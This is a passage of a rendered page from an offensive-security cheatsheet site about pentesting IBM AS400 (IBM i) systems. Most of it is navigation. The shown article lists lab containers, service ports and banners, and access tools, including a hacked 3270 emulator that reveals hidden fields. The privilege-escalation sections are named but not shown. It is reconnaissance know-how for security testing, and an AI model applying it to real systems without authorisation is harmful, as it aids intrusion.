  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-drone-ci/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CI/CD - Drone CI
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-github-actions/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CI/CD - GitHub Actions
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/cicd-gitlab-ci/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    CI/CD - Gitlab CI
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/package-managers/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Package Managers and Build Files
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../devops/secrets-enumeration/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hardcoded Secrets Enumeration
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Methodology
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            Methodology
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/android-applications/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Android Application
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/bug-hunting-methodology/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Bug Hunting Methodology
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/source-code-analysis/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Source Code Analysis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../methodology/vulnerability-reports/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Vulnerability Reports
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
        
          
          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Redteam
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11">
            <span class="md-nav__icon md-icon"></span>
            Redteam
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_1" >
        
          
          <label class="md-nav__link" for="__nav_11_1" id="__nav_11_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Access
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_1">
            <span class="md-nav__icon md-icon"></span>
            Access
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/clickfix/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ClickFix
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/html-smuggling/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    HTML Smuggling
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/initial-access/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Initial Access
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/office-attacks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Office - Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/phishing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Phishing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/web-attack-surface/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Web Attack Surface
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/windows-download-execute/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - Download and execute methods
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/access/windows-using-credentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - Using credentials
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_2" >
        
          
          <label class="md-nav__link" for="__nav_11_2" id="__nav_11_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Escalation
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_2">
            <span class="md-nav__icon md-icon"></span>
            Escalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/escalation/linux-privilege-escalation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Linux - Privilege Escalation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/escalation/windows-privilege-escalation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - Privilege Escalation
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_3" >
        
          
          <label class="md-nav__link" for="__nav_11_3" id="__nav_11_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Evasion
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_3">
            <span class="md-nav__icon md-icon"></span>
            Evasion
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/edr-bypass/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Endpoint Detection and Response
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/elastic-edr/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Elastic EDR
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/linux-evasion/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Linux - Evasion
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/opsec-fails/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    OPSEC
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/proxy-bypass/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Proxy Bypass
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-amsi-bypass/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - AMSI Bypass
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-defenses/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - Defenses
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/evasion/windows-dpapi/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - DPAPI
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_4" >
        
          
          <label class="md-nav__link" for="__nav_11_4" id="__nav_11_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Persistence
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_4">
            <span class="md-nav__icon md-icon"></span>
            Persistence
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/persistence/linux-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Linux - Persistence
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/persistence/rdp-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    RDP - Persistence
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/persistence/windows-persistence/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Windows - Persistence
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_5" >
        
          
          <label class="md-nav__link" for="__nav_11_5" id="__nav_11_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Pivoting
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_11_5">
            <span class="md-nav__icon md-icon"></span>
            Pivoting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redteam/pivoting/network-pivoting-techniques/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Network Pivoting Techniques
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab" class="md-nav__link">
    <span class="md-ellipsis">
      Lab
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#access-and-audit" class="md-nav__link">
    <span class="md-ellipsis">
      Access and Audit
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#default-credentials" class="md-nav__link">
    <span class="md-ellipsis">
      Default Credentials
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      User Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="User Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#telnet" class="md-nav__link">
    <span class="md-ellipsis">
      Telnet
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pop3" class="md-nav__link">
    <span class="md-ellipsis">
      POP3
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ftp" class="md-nav__link">
    <span class="md-ellipsis">
      FTP
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#useful-commands" class="md-nav__link">
    <span class="md-ellipsis">
      Useful Commands
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nmap-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      NMAP Scripts
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-class" class="md-nav__link">
    <span class="md-ellipsis">
      User Class
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#authority" class="md-nav__link">
    <span class="md-ellipsis">
      Authority
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#special-authority" class="md-nav__link">
    <span class="md-ellipsis">
      Special Authority
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#adopted-authority" class="md-nav__link">
    <span class="md-ellipsis">
      Adopted Authority
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#password-cracking" class="md-nav__link">
    <span class="md-ellipsis">
      Password Cracking
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    <span class="md-ellipsis">
      Privilege Escalation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privilege Escalation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#initial-program-breakout" class="md-nav__link">
    <span class="md-ellipsis">
      Initial Program Breakout
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hijack-profile-secofr-security-class" class="md-nav__link">
    <span class="md-ellipsis">
      Hijack Profile - SECOFR Security Class
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hijack-profile-authorities" class="md-nav__link">
    <span class="md-ellipsis">
      Hijack Profile - Authorities
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hijack-profile-profile-swapping" class="md-nav__link">
    <span class="md-ellipsis">
      Hijack Profile - Profile Swapping
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unqualified-library-calls" class="md-nav__link">
    <span class="md-ellipsis">
      Unqualified Library Calls
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#from-allobj-to-secadm" class="md-nav__link">
    <span class="md-ellipsis">
      From ALLOBJ to SECADM
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#arbitrary-command-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Arbitrary Command Execution
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
	
                  


  
    <a href="https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cheatsheets/as-400.md" title="Edit this page" class="md-content__button md-icon" rel="edit">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
    </a>
  
  
    
      
    
    <a href="https://github.com/swisskyrepo/InternalAllTheThings/raw/main/docs/cheatsheets/as-400.md" title="View source of this page" class="md-content__button md-icon">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
    </a>
  


<h1 id="as400">AS400</h1>
<p>AS400 (IBM i) is a midrange computer system developed by IBM, originally released in 1988. Now known as IBM i running on Power Systems, it is widely used for business applications due to its stability, security, and integrated database (DB2 for i)</p>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="#lab">Lab</a></li>
<li><a href="#enumeration">Enumeration</a></li>
<li><a href="#access-and-audit">Access and Audit</a></li>
<li><a href="#default-credentials">Default Credentials</a></li>
<li><a href="#user-enumeration">User Enumeration</a><ul>
<li><a href="#telnet">Telnet</a></li>
<li><a href="#pop3">POP3</a></li>
<li><a href="#ftp">FTP</a></li>
</ul>
</li>
<li><a href="#useful-commands">Useful Commands</a></li>
<li><a href="#nmap-scripts">NMAP Scripts</a></li>
<li><a href="#user-class">User Class</a></li>
<li><a href="#authority">Authority</a></li>
<li><a href="#special-authority">Special Authority</a></li>
<li><a href="#adopted-authority">Adopted Authority</a></li>
<li><a href="#password-cracking">Password Cracking</a></li>
<li><a href="#privilege-escalation">Privilege Escalation</a><ul>
<li><a href="#initial-program-breakout">Initial Program Breakout</a></li>
<li><a href="#hijack-profile---secofr-security-class">Hijack Profile - SECOFR Security Class</a></li>
<li><a href="#hijack-profile---authorities">Hijack Profile - Authorities</a></li>
<li><a href="#hijack-profile---profile-swapping">Hijack Profile - Profile Swapping</a></li>
<li><a href="#unqualified-library-calls">Unqualified Library Calls</a></li>
<li><a href="#from-allobj-to-secadm">From ALLOBJ to SECADM</a></li>
<li><a href="#arbitrary-command-execution">Arbitrary Command Execution</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
<h2 id="lab">Lab</h2>
<ul>
<li><a href="https://github.com/mainframed/DC30_Workshop">mainframed/DC30_Workshop</a> - DEFCON 30 Mainframe buffer overlow workshop container</li>
<li>
<p><a href="https://github.com/mainframed/DVCA">mainframed/DVCA</a> - Damn Vulnerable CICS Application</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">docker</span> <span class="n">run</span> <span class="n">-d</span> <span class="p">\</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="p">-</span><span class="n">-name</span><span class="p">=</span><span class="n">dvca</span> <span class="p">\</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">-e</span> <span class="n">HUSER</span><span class="p">=</span><span class="n">docker</span> <span class="p">\</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">-e</span> <span class="n">HPASS</span><span class="p">=</span><span class="n">docker</span> <span class="p">\</span>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="n">-p</span> <span class="n">21</span><span class="p">:</span><span class="n">21</span> <span class="p">\</span>
<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="n">-p</span> <span class="n">23</span><span class="p">:</span><span class="n">23</span> <span class="p">\</span>
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="n">-p</span> <span class="n">3270</span><span class="p">:</span><span class="n">3270</span> <span class="p">\</span>
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="n">-p</span> <span class="n">3505</span><span class="p">:</span><span class="n">3505</span> <span class="p">\</span>
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="n">-p</span> <span class="n">3506</span><span class="p">:</span><span class="n">3506</span> <span class="p">\</span>
<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="n">-p</span> <span class="n">8888</span><span class="p">:</span><span class="n">8888</span> <span class="p">\</span>
<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="n">-v</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">docker</span><span class="p">/</span><span class="n">dvca</span><span class="p">:/</span><span class="n">config</span> <span class="p">\</span>
<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="n">-v</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">docker</span><span class="p">/</span><span class="n">dvca</span><span class="p">/</span><span class="n">printers</span><span class="p">:/</span><span class="n">printers</span> <span class="p">\</span>
<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="n">-v</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">docker</span><span class="p">/</span><span class="n">dvca</span><span class="p">/</span><span class="n">punchcards</span><span class="p">:/</span><span class="n">punchcards</span> <span class="p">\</span>
<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="n">-v</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">docker</span><span class="p">/</span><span class="n">dvca</span><span class="p">/</span><span class="n">logs</span><span class="p">:/</span><span class="n">logs</span> <span class="p">\</span>
<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="n">-v</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">docker</span><span class="p">/</span><span class="n">dvca</span><span class="p">/</span><span class="n">dasd</span><span class="p">:/</span><span class="n">dasd</span> <span class="p">\</span>
<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="n">-v</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">docker</span><span class="p">/</span><span class="n">dvca</span><span class="p">/</span><span class="n">certs</span><span class="p">:/</span><span class="n">certs</span> <span class="p">\</span>
<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="p">-</span><span class="n">-restart</span> <span class="n">unless-stopped</span> <span class="p">\</span>
<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="n">mainframed767</span><span class="p">/</span><span class="n">dvca</span><span class="p">:</span><span class="n">latest</span>
</code></pre></div>
</li>
</ul>
<h2 id="enumeration">Enumeration</h2>
<p>By default, the FTP service send a banner with the following prefix:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">220-QTCP</span> <span class="n">at</span>
</code></pre></div>
<p>Common ports in AS400 devices:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">20</span><span class="p">,</span> <span class="n">21</span><span class="p">,</span> <span class="n">23</span><span class="p">,</span> <span class="n">25</span><span class="p">,</span> <span class="n">80</span><span class="p">,</span> <span class="n">110</span><span class="p">,</span> <span class="n">137</span><span class="p">,</span> <span class="n">138</span><span class="p">,</span> <span class="n">139</span><span class="p">,</span> <span class="n">389</span><span class="p">,</span> <span class="n">443</span><span class="p">,</span> <span class="n">446</span><span class="p">,</span> <span class="n">448</span><span class="p">,</span> <span class="n">449</span><span class="p">,</span> <span class="n">512</span><span class="p">,</span> <span class="n">910</span><span class="p">,</span> <span class="n">992</span><span class="p">,</span> <span class="n">2001</span><span class="p">,</span> <span class="n">2010</span><span class="p">,</span> <span class="n">3000</span><span class="p">,</span> <span class="n">5061</span><span class="p">,</span> <span class="n">5544</span><span class="p">,</span> <span class="n">5555</span><span class="p">,</span> <span class="n">5566</span><span class="p">,</span> <span class="n">5577</span><span class="p">,</span> <span class="n">8470</span><span class="p">,</span> <span class="n">8471</span><span class="p">,</span> <span class="n">8472</span><span class="p">,</span> <span class="n">8473</span><span class="p">,</span> <span class="n">8474</span><span class="p">,</span> <span class="n">8475</span><span class="p">,</span> <span class="n">8476</span><span class="p">,</span> <span class="n">9470</span><span class="p">,</span> <span class="n">9471</span><span class="p">,</span> <span class="n">9472</span><span class="p">,</span> <span class="n">9473</span><span class="p">,</span> <span class="n">9474</span><span class="p">,</span> <span class="n">9475</span><span class="p">,</span> <span class="n">9476</span>
</code></pre></div>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
<th>Port</th>
<th>Port (SSL)</th>
</tr>
</thead>
<tbody>
<tr>
<td>FTP</td>
<td>FTP server is used to access the AS/400 file system</td>
<td>20,21</td>
<td>/</td>
</tr>
<tr>
<td>Telnet</td>
<td>Telnet server is used to access 5250 emulation</td>
<td>23</td>
<td>992</td>
</tr>
<tr>
<td>SMTP</td>
<td>SMTP server is used to provide mail transfer</td>
<td>25</td>
<td>/</td>
</tr>
<tr>
<td>HTTP</td>
<td>HTTP server is used to provide web page</td>
<td>80</td>
<td>443</td>
</tr>
<tr>
<td>POP3</td>
<td>POP3 server is used to provide mail fetch</td>
<td>110</td>
<td>910</td>
</tr>
<tr>
<td>NetServer</td>
<td>NetServer allows access to AS/400 integrated file system from Windows PCs</td>
<td>137,138,139,445</td>
<td>/</td>
</tr>
<tr>
<td>LDAP</td>
<td>LDAP provides a network directory service</td>
<td>389</td>
<td>636</td>
</tr>
<tr>
<td>DDM</td>
<td>DDM server is used to access data via DRDA and for record level access.</td>
<td>446</td>
<td>448</td>
</tr>
<tr>
<td>As-svrmap</td>
<td>Port mapper returns the port number for the requested server.</td>
<td>449</td>
<td>/</td>
</tr>
<tr>
<td>As-rmtcmd</td>
<td>Remote command server is used to send commands from a PC to an AS/400 and for program calls.</td>
<td>512</td>
<td>/</td>
</tr>
<tr>
<td>As-admin-http</td>
<td>HTTP server administration.</td>
<td>2001</td>
<td>2010</td>
</tr>
<tr>
<td>As-sts</td>
<td>Service tools server</td>
<td>3000</td>
<td>/</td>
</tr>
<tr>
<td>As-mtgc</td>
<td>Management Central server is used to manage multiple AS/400s in a network.</td>
<td>5555,5544</td>
<td>5566,5577</td>
</tr>
<tr>
<td>As-central</td>
<td>Central server is used when a Client Access license is required and for downloading translation tables.</td>
<td>8470</td>
<td>9470</td>
</tr>
<tr>
<td>As-database</td>
<td>Database server is used for accessing the AS/400 database.</td>
<td>8471</td>
<td>9471</td>
</tr>
<tr>
<td>As-dtaq</td>
<td>Data Queue server allows access to the AS/400 data queues, used for passing data between applications.</td>
<td>8472</td>
<td>9472</td>
</tr>
<tr>
<td>As-file</td>
<td>File Server is used for accessing any part of the AS/400 file system.</td>
<td>8473</td>
<td>9473</td>
</tr>
<tr>
<td>As-netprt</td>
<td>Printer Server is used to access printers known to the AS/400.</td>
<td>8474</td>
<td>9474</td>
</tr>
<tr>
<td>As-rmtcmd</td>
<td>Remote command server is used to send commands from a PC to an AS/400 and for program calls.</td>
<td>8475</td>
<td>9475</td>
</tr>
<tr>
<td>As-signon</td>
<td>Sign-on server is used for every Client Access connection to authenticate users and to change passwords.</td>
<td>8476</td>
<td>9476</td>
</tr>
</tbody>
</table>
<h2 id="access-and-audit">Access and Audit</h2>
<p><strong>Access</strong>:</p>
<ul>
<li><a href="https://github.com/tn5250/tn5250">tn5250/tn5250</a> - A curses-based 5250 terminal client</li>
<li><a href="https://x3270.bgp.nu/">x3270</a> - IBM 3270 terminal emulator</li>
<li><a href="https://github.com/ayoul3/wc3270_hacked">ayoul3/wc3270_hacked</a> - A hacked version of wc3270 that removes field protection and displays hidden fields</li>
<li><a href="https://mochasoft.dk/tn3270.htm">Mocha TN3270</a> - Mocha TN3270 provides TN3270 emulation for IBM Mainframe Access</li>
<li><a href="https://mochasoft.dk/tn5250.htm">Mocha TN5250</a> - Mocha TN5250 provides TN5250 emulation for IBM Mainframe Access</li>
<li>IBM i Access Client Solutions (5250 Console): <code>servername.com/WSG</code> or Telnet</li>
<li>IBM Navigator for i (Web Interface): <code>http://systemName:2001</code></li>
</ul>
<p>Signed-off profiles can still be used—not for opening a 5250 session, but they should work with other protocols.</p>
<p>All the objects can be queried from the database DB2.</p>
<p><strong>Audit</strong>:</p>
<ul>
